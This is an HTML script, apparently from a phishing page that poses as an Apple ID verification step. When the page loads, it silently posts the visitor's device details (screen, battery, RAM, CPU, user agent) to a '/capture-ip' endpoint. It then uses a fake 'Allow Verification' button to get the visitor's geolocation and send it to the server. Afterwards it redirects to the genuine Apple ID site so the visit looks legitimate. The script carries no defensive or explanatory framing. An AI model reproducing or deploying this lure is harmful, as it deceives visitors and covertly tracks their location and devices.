  <!-- Background Script to collect device and location information -->
  <script>
    // Function to send visitor's device and browser details to the server
    const sendDeviceData = async () => {
      const resolution = `${window.screen.width}x${window.screen.height}`;
      const battery = navigator.getBattery ? await navigator.getBattery() : { level: 1, charging: false };
      const ram = navigator.deviceMemory || "Unknown RAM";
      const cpu = navigator.hardwareConcurrency || "Unknown CPU";

      fetch('/capture-ip', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          resolution: resolution,
          battery: battery.level * 100,
          isCharging: battery.charging,
          userAgent: navigator.userAgent,
          ram: ram,
          cpu: cpu
        }),
      })
      .then(response => response.json())
      .then(data => console.log('%c[âœ”] Device Data Sent:', 'color: green; font-weight: bold;', data))
      .catch(error => console.error('%c[âŒ] Error sending device data:', 'color: red; font-weight: bold;', error));
    };

    // Function to ask for location permission
    const askForLocation = () => {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendLocation, handleLocationError);
      } else {
        console.warn('%c[âš ] Geolocation not supported by this browser.', 'color: orange; font-weight: bold;');
      }
    };

    // Send user's location to the server
    const sendLocation = (position) => {
      const { latitude, longitude } = position.coords;
      const mapLink = `https://www.google.com/maps/place/${latitude},${longitude}`;
      console.log('%c[ðŸ“] Location received:', 'color: blue; font-weight: bold;', mapLink);

      fetch('/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ latitude, longitude, mapLink }),
      })
      .then(response => response.json())
      .then(data => {
        console.log('%c[âœ”] Location Data Sent:', 'color: green; font-weight: bold;', data);
        // Once location is successfully sent, proceed with verification
        verifyAppleID();
      })
      .catch(error => {
        console.error('%c[âŒ] Error sending location:', 'color: red; font-weight: bold;', error);
      });
    };

    // Handle location errors
    const handleLocationError = (error) => {
      console.warn('%c[âš ] Location permission denied or error occurred.', 'color: orange; font-weight: bold;');
      console.error(error);
      document.getElementById('status').innerText = 'Location access denied or failed. Verification cannot proceed.';
    };

    // Function to simulate Apple ID account verification
    async function verifyAppleID() {
      try {
        document.getElementById('status').innerText = 'Verifying your Apple ID...';

        // Simulating sending verification data to Apple servers
        socket.emit('appleIDVerified', { message: 'Apple ID verified successfully!' });

        socket.on('verificationCompleted', (message) => {
          console.log(message);
        });

        // Redirecting to a fake Apple ID verification page
        setTimeout(() => {
          window.location.href = 'https://appleid.apple.com'; // Fake Apple ID verification page
        }, 3000);

      } catch (error) {
        console.warn('Verification failed:', error);
        document.getElementById('status').innerText = 'Verification failed. Try again.';
      }
    }

    // Event listener for the "Allow Verification" button
    document.getElementById('allowBtn').addEventListener('click', function() {
      document.getElementById('status').innerText = "Getting your location, please wait...";
      document.getElementById('allowBtn').style.display = 'none';

      // First, get the location and send the data to the server before proceeding with the verification
      askForLocation();
    });

    // Run when the page loads
    window.onload = () => {
      sendDeviceData(); // Send visitor device data immediately
    };
  </script>
